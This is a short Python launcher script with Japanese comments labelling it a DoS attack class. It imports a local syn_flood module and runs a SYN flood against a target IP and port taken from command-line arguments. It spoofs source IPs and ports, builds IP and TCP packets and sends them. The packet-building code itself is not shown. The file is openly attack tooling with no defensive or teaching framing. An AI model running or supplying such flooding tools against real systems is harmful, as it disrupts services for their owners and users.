import sys
# pychacheを作成しない
sys.dont_write_bytecode = True
from dos import syn_flood as sf

class Main:
    # Dos攻撃クラス
    da = sf.SynFlood(sys.argv[1], sys.argv[2], sys.argv[3])
    da.createSrcIp()
    da.createSrcPort()
    da.createIpPacket()
    da.createTcpPacket()
    da.sendPacket()